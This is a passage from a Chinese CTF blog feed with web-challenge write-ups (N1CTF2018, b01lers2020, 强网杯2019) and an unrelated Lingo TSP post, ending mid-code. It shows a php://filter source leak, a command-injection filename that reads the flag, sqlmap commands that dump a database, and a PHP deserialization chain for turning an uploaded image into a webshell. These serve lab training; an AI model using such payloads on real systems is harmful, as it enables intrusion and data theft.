class="line">http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn//user.php?page=php://filter/convert.base64-encode/resource=m4aaannngggeee#</span><br></pre></td></tr></table></figure><p><code>m4aaannngggeee.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/upload.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>/templates/upload.html</code>是个上传文件的界面，上传个php文件试一试，果然不行，报错如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not Found</span><br><span class="line">The requested URL /templates/upllloadddd.php was not found on this server.</span><br><span class="line"></span><br><span class="line">Apache/2.4.7 (Ubuntu) Server at 8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn Port 80</span><br></pre></td></tr></table></figure><p>注意到<code>/templates/upllloadddd.php</code>文件，php伪协议拿到他的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn//user.php?page=php://filter/convert.base64-encode/resource=upllloadddd#</span><br></pre></td></tr></table></figure><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$picdata</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$picdata</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现命令注入点<code>rce这不就来了嘛，不过nm这也太多文件了</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$picdata</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br></pre></td></tr></table></figure><p>文件名就是上传的文件名，好了bp配合火狐一波注入测试，发起请求页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn/user.php?page=m4aaannngggeee#</span><br></pre></td></tr></table></figure><p><code>upload.html</code>界面不可以，<del>自己做的时候大意了啊，妹想到，年轻题目，不讲武德</del><br><img src="/2020/11/17/N1CTF2018//1.png"><br>这个命令就拼接为了<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/;ls;</code><br>然后我们想看主目录就拼接命令为<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/;cd /;ls;</code>，改filename为<code>;cd /;ls;#</code>，不行，<code>/被过滤了</code>，<code>;cd ..;ls;#</code>，回一级就到了根目录是我没有想到的。。。<br>注意到文件<code>flag_233333</code>，我们要拼接的命令就变为了<code>;cd ..;cat flag_233333;#</code><br><img src="/2020/11/17/N1CTF2018//2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>b01lers2020部分web复现</title>
      <link href="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>期待一种阳光，温暖却不刺眼。</p></blockquote><h1 id="1-Life-on-Mars"><a href="#1-Life-on-Mars" class="headerlink" title="1.Life on Mars"></a>1.Life on Mars</h1><p>首先是个左侧为火星上面的各个地点的页面，可以点击页面跳转，猜测此过程中应该发生了sql查询。<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//1.png"></p><p>然后用bp抓包测试一下，点击看一下亚马逊平原的信息，抓包的时候抓到了请求，如下图：<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1605531996491</span><br></pre></td></tr></table></figure><h2 id="1-sqlmap测试"><a href="#1-sqlmap测试" class="headerlink" title="1.sqlmap测试"></a>1.sqlmap测试</h2><p>好久没用过sqlmap了，这么强大的工具竟然有快大年没有用了，现在再次操起sqlmap开始，先查是否有注入点，用下面的语句</p><blockquote><p>测试所获得的结果都在对应语句之下的截图里面。</p></blockquote><h3 id="1-查注入点-amp-查数据库"><a href="#1-查注入点-amp-查数据库" class="headerlink" title="1.查注入点&amp;查数据库"></a>1.查注入点&amp;查数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn/query?search=amazonis_planitia --dbs</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//3.png" alt="测试结果-查注入点"><br>可以看到确实能用sqlmap，那一般就也能用sqlmap一把梭了，这里看到了三个数据库，分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases [3]:</span><br><span class="line">[*] alien_code</span><br><span class="line">[*] aliens</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><p>下面再对上面的两个特别的数据库测试一下，看看那个可疑，感觉第一个<code>alien_code</code>有点可疑啊，那下面就先查她的表了。</p><h3 id="2-查表"><a href="#2-查表" class="headerlink" title="2.查表"></a>2.查表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn/query?search=amazonis_planitia -D alien_code --tables</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//4.png" alt="测试结果-查tables"></p><p>查到了下面的这个<code>code</code>表。</p><h3 id="3-查字段"><a href="#3-查字段" class="headerlink" title="3.查字段"></a>3.查字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn/query?search=amazonis_planitia -D alien_code -T code --columns</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//5.png" alt="测试结果-查columns"><br>下面的<code>varchar</code>类型的<code>code</code>可疑，dump下来看一看。</p><h3 id="4-dump数据"><a href="#4-dump数据" class="headerlink" title="4.dump数据"></a>4.dump数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn/query?search=amazonis_planitia -D alien_code -T code -C code --dump</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//6.png" alt="测试结果-查数据值"></p><p>得flag:<code>flag&#123;a8bcd918-d4e5-4f92-b738-e726c6634d6e&#125;</code></p><blockquote><p>传统注入，自然是点到为止，到这里我们就赢了，就不测试手注了。</p></blockquote><p><strong>sqlmap这一把梭也太无脑了⑧，体现不出实力，算了，本来就是个菜鸡。</strong></p><h1 id="2-Space-Noodles"><a href="#2-Space-Noodles" class="headerlink" title="2.Space Noodles"></a>2.Space Noodles</h1><p>这里打开界面首先显示的是一个不能使用GET的页面，然后我们用BP抓包，将GET请求方式改为POST回显提示信息如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text ? pleas test teh follwing five roots</span><br><span class="line"></span><br><span class="line">,</span><br><span class="line">circle two I&#x27;m am making an a pea eye and its grate PHP is the best printf(hello world) squaretwo :pleasequithelpwww.google. com/seaerch how to exit vim/quit :wqwhy isnt it working:wq:wq:wq:qw? </span><br></pre></td></tr></table></figure><p>看到最后猜测可能是个vim源码泄露，下载文件<code>/.index.php.swp</code><del>下载了个寂寞，啥都没有，看官方wp</del></p><p><a href="https://ctftime.org/writeup/18801">官方wp</a></p><p>这里wp说他是要让我们是用各种http的请求方式来请求界面<code>/circle/one/</code>、<code>/square/</code>、<code>/two/</code>、<code>/com/seaerch/</code>、<code>/vim/quit</code>，会给出五个部分的flag，最终提交总的flag就ok了。<br>这里先列一下http的各个请求方式分别为<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//7.png" alt="HTTP的8种请求方法"></p><p>按他给的payload测试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. OPTIONS  /circle/one/</span><br><span class="line">2. DELETE   /square/</span><br><span class="line">3. CONNECT  /two/</span><br><span class="line">4. GET      /com/seaerch/</span><br><span class="line">5. TRACE    /vim/quit/</span><br></pre></td></tr></table></figure><p>自己挨个测的话也就测个几十次就也能测出来吧，或者根据下面的这种<code>curl</code>方式写个python脚本，我不太会写<del>其实就是不会写</del><br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//8.png" alt="curl之post"></p><p>那就老老实实测试呗，pycurl一点也不会用的这个样子，用curl测<br><strong>1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.先curl -X OPTIONS http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/circle/one/</span><br><span class="line">报错:</span><br><span class="line">Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell </span><br><span class="line">Warning: curl to output it to your terminal anyway, or consider &quot;--output </span><br><span class="line">Warning: &lt;FILE&gt;&quot; to save to a file.</span><br><span class="line">有个二进制文件输出，得添加--output选项输出文件，下面再次测试</span><br><span class="line">1.1.curl -X OPTIONS http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/circle/one/ --output ./1.txt</span><br><span class="line">成功下载文件到当前目录下，移到windows里面去打开，肯定不是txt文本文件，因为上面提示的似乎就是二进制文件，这里假装不知道是pdf文件，以txt文件的形式打开，第一行显示`%PDF-1.3`，猜测是pdf文件，改后缀名为.pdf后打开。</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//9.png"><br>这算是得到了一部分flag<code>ketchup</code>?是的话那也太misc了吧。。。</p><blockquote><p>希望明白的师傅联系我QQ:2994016494</p></blockquote><p><strong>2</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.curl -X DELETE http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/square/ --output 2.txt   #还是文件，这里错的就不粘了。</span><br><span class="line">看文件头是个PNG文件，下面是图片内容</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//10.png"><br>我英语不好，如果比赛到这，<del>wtm直接放弃</del>。还是再看看后面的内容吧</p><p><strong>3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.curl -X CONNECT http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/two/ --output 3.txt</span><br><span class="line">png图片，下面就是图片内容</span><br></pre></td></tr></table></figure><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0//11.png"><br>这这这，瞧不起谁呢？我直接重拳出击<code>up_on_noodles</code></p><p><strong>4</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3.curl -X GET http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/com/seaerch/</span><br><span class="line">这里报错&lt;提示&gt;</span><br><span class="line">&lt;htlm&gt;                                                                                                                                      </span><br><span class="line">                                                                                                                                            </span><br><span class="line">,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:                                                                                              </span><br><span class="line">                                                                                                                                            </span><br><span class="line">  ERROR &lt;/&gt; search=null&lt;/end&gt;                                                                                                               </span><br><span class="line">                                                                                                                                            </span><br><span class="line">&lt;/html&gt;</span><br><span class="line">需要传一个名为search的参数，这里传search=flag,注意以GET方式传参哦。</span><br><span class="line">3.1.curl -X GET http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/com/seaerch/?search=flag</span><br></pre></td></tr></table></figure><p><strong>5</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.curl -X TRACE http://166fea50-daba-4e6c-9654-f3e2690311b9.node3.buuoj.cn/vim/quit</span><br></pre></td></tr></table></figure><p>环境坏了，cao了，trace没开？一直回显<code>405 Not Allowed</code></p><p><strong>总结</strong></p><p>就温习了几种请求方式，好家伙，不是web-misc就是环境不能用，gg，下面是大佬的flag，不能无功而返啊也<br><code>flag&#123;ketchup_on_noodles_tastes_good_in_space_too&#125;</code>，，，，<code>必拿下</code><br><del>注:疑似buu环境问题</del>，下面给出官方wp的解释，或许便于以后复现，不过这题除了web-misc也没啥难的了吧。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lingo解决TSP问题</title>
      <link href="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/"/>
      <url>/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>送货郎从一地址出发，途径各地，这里我们有每地到其他各地的距离，每地能且只能经过一次，最后回到出发点，求能走最短路程的路线？</p><h3 id="模型分析"><a href="#模型分析" class="headerlink" title="模型分析"></a>模型分析</h3><p>这里数学不好不做分析了，看书本上的分析，也就是对条件进行各种限制罢了。</p><p><strong>构成回路的分析稍显麻烦，这里直接引用了树上的内容</strong><br><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98//0.png" alt="上"><br><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98//1.png" alt="中"><br><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98//2.png" alt="下"></p><h3 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h3><p><strong>这里的题目也是用到了lingo</strong></p><blockquote><p>这个真的就是最简单的线性规划问题了吧，我太菜了。</p></blockquote><p>lingo一般用来解决线性规划问题求出最优解（最大最小这个样子），在lingo中，这种求最大最小解的函数一般都是以<code>min=</code>或者<code>max=</code>什么开头的</p><blockquote><p>采用的应该是线性规划模型。<br><code>代码如下</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">!TSP(Traveling Salesman Problem送货郎)问题;</span><br><span class="line">MODEL:</span><br><span class="line">SETS:</span><br><span class="line">city/1..6/:u;</span><br><span class="line">link(city,city):d,x;        </span><br><span class="line">ENDSETS</span><br><span class="line"></span><br><span class="line">DATA:</span><br><span class="line">d=@FILE(F:\data1\data1.txt);     !导入距离矩阵，这里我放在了F盘的data1目录下，文件名为data1.txt;</span><br><span class="line">@text()=@writefor(link(i,j)|x(i,j)#gt#0:&#x27;x(&#x27;,i,&#x27;,&#x27;,j,&#x27;)=&#x27;,x(i,j));     !指定输出格式，输出为1的x;</span><br><span class="line">ENDDATA</span><br><span class="line"></span><br><span class="line">min=@sum(link:d*x);                                                            !最优解即路程的最小值</span><br><span class="line">@for(city(j):@sum(city(i)|j#ne#i:x(i,j))=1);                                   !一列只有一个1;</span><br><span class="line">@for(city(i):@sum(city(j)|j#ne#i:x(i,j))=1);                                   !一行只有一个1;</span><br><span class="line">@for(link(i,j)|i#ne#j#and#i#gt#1:u(i)-u(j)+6*x(i,j)&lt;=5);                       !破圈;</span><br><span class="line">@for(link:@bin(x));                                                            !限制x取0或1;</span><br><span class="line">End</span><br></pre></td></tr></table></figure><p>得到的结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x(1,4)=1 x(2,6)=1 x(3,1)=1 x(4,5)=1 x(5,2)=1 x(6,3)=1  Model Class:                                      MILP</span><br><span class="line"></span><br><span class="line">所以路线可为(因数据较少可直接使用观察法[\滑稽])</span><br><span class="line">1-4-5-2-6-3-1</span><br></pre></td></tr></table></figure><p>此路线下可以使货郎走过的路程最短。</p><p>如图是运行结果，很快啊，就得到了结果。</p><p><img src="/2020/11/15/Lingo%E8%A7%A3%E5%86%B3TSP%E9%97%AE%E9%A2%98//3.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Lingo </tag>
            
            <tag> 数学建模 </tag>
            
            <tag> tsp </tag>
            
            <tag> 线性规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019</title>
      <link href="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"/>
      <url>/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/</url>
      
        <content type="html"><![CDATA[<blockquote><p>阿巴阿巴阿巴阿巴。</p></blockquote><h1 id="1-Upload"><a href="#1-Upload" class="headerlink" title="1.Upload"></a>1.Upload</h1><p><strong>Tag:源码泄露，反序列化，getshell</strong></p><h2 id="1-源码泄露"><a href="#1-源码泄露" class="headerlink" title="1.源码泄露"></a>1.源码泄露</h2><p>用dirmap扫描目录后发现文件<code>/www.tar.gz</code>，下载一下<br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019//1.png"></p><h2 id="2-分析源代码"><a href="#2-分析源代码" class="headerlink" title="2.分析源代码"></a>2.分析源代码</h2><p>源代码很多，看到有.idea就用phpstorm打开，然后就看到了有提示，<del>这提示，无处不在啊</del>，下面是截图<br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019//2.png"><br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019//3.png"><br>可以看到检查是否注册过的时候进行了反序列化操作，主要利用到的有两个文件，一个是<code>Register.php</code>文件，另一个文件是<code>Profile.php</code>。第一个文件是因为其析构方法，而第二个文件是我们主要要利用到的文件，在这里可以借用反序列化修改我们上传的图片(马)的后缀名从而<code>getshell</code>。</p><h2 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a>3.构造payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span 